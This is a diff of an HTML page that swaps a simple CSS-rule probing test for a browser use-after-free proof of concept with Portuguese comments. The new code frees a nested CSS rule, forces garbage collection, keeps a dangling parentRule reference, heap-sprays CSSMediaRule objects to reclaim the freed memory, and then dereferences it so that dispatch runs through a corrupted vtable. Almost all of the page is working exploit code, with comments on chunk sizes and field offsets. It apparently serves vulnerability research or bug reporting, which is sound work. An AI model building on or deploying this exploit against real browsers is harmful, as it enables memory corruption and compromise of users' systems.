@@ -1,74 +1,63 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button id="run">Run Short Cycle Test</button>
-<pre id="log"></pre>
-
 <script>
-const logEl = document.getElementById("log");
-function log(msg) {
-    logEl.textContent += msg + "\n";
-}
-
-function allocCycle(n) {
-    for (let i = 0; i < n; i++) {
-        const tmp = { idx: i, tag: "cycle_" + i + "_abcdef0123456789" };
-        if (i % 64 === 0)
-            new Array(32).fill(tmp.tag);
+function gc() {
+    function gcRec(n) {
+        if (n < 1) return {};
+        var temp = {i: "ab" + i + (i / 100000)};
+        temp += "foo";
+        gcRec(n-1);
     }
+    for (var i = 0; i < 10000; i++)
+        gcRec(10);
 }
 
-function makeDetachedChild() {
-    const style = document.createElement("style");
-    document.head.appendChild(style);
-    const sheet = style.sheet;
+// Fase 1: Criar o UAF
+const style = document.createElement("style");
+document.head.appendChild(style);
+const sheet = style.sheet;
+sheet.insertRule(".outer { color: red; & .nested { color: blue; } }", 0);
 
-    sheet.insertRule(".outer { color: red; & .nested { color: blue; } }", 0);
-    const child = sheet.cssRules[0].cssRules[0];
-    sheet.deleteRule(0);
-    style.remove();
-    return child;
+let nestedRules = sheet.cssRules[0].cssRules;
+sheet.deleteRule(0);
+gc();
+
+const nested = nestedRules[0];
+nestedRules = null;
+gc();
+
+// Fase 2: Capturar o wrapper dangling ANTES do spray
+// (mantém referência JS para o C++ ptr já freed)
+let danglingParent = nested.parentRule;
+document.write("Dangling capturado: " + (danglingParent !== null) + "<br>");
+
+// Fase 3: Heap spray — reusar o chunk de ~96 bytes do CSSStyleRule freed
+// Spray com CSSMediaRule (@media) que tem tamanho similar mas vtable DIFERENTE
+let spray = [];
+for (let i = 0; i < 100000; i++) {
+    let el = document.createElement("style");
+    document.head.appendChild(el);
+    // CSSMediaRule: vtable diferente de CSSStyleRule, tamanho similar (~96 bytes)
+    el.sheet.insertRule("@media all { .x" + i + " { color:red } }", 0);
+    spray.push(el.sheet.cssRules[0]);
 }
 
-function probeChild(child) {
-    try {
-        const pr = child.parentRule;
-        if (!pr)
-            return "parentRule=null";
-        return "parentRule=" + pr + " | sel=" + pr.selectorText;
-    } catch (e) {
-        return "ERR: " + e;
-    }
+// Fase 4: Acesso UAF — vtable corrompida ou dados inválidos → crash
+if (danglingParent) {
+    // selectorText() → virtual dispatch → vtable[slot] no chunk reusado
+    // Se o chunk foi reusado por CSSMediaRule:
+    //   vtable de CSSMediaRule no lugar de CSSStyleRule
+    //   → slot errado → endereço inválido → SIGSEGV
+    let result = danglingParent.selectorText;
+    document.write("UAF result: " + result + "<br>");
+    
+    // Se não crashou acima, tentar acesso mais profundo:
+    // cssRules lê m_ruleListCSSOMWrapper (offset 0x58)
+    // se reusado → ponteiro inválido → SIGSEGV
+    let rules = danglingParent.cssRules;
+    document.write("cssRules count: " + rules.length + "<br>");
 }
-
-document.getElementById("run").addEventListener("click", () => {
-    logEl.textContent = "";
-    try {
-        let child = makeDetachedChild();
-        log("Init: " + probeChild(child));
-
-        let step = 1;
-        const maxSteps = 12;
-
-        function tick() {
-            allocCycle(3000);
-            log("Step " + step + "/" + maxSteps + ": " + probeChild(child));
-
-            if (step < maxSteps) {
-                step++;
-                setTimeout(tick, 25);
-            } else {
-                child = null;
-                allocCycle(3000);
-                log("Done (child cleared)");
-            }
-        }
-
-        setTimeout(tick, 25);
-    } catch (e) {
-        log("Top error: " + e);
-    }
-});
 </script>
 </body>
 </html>
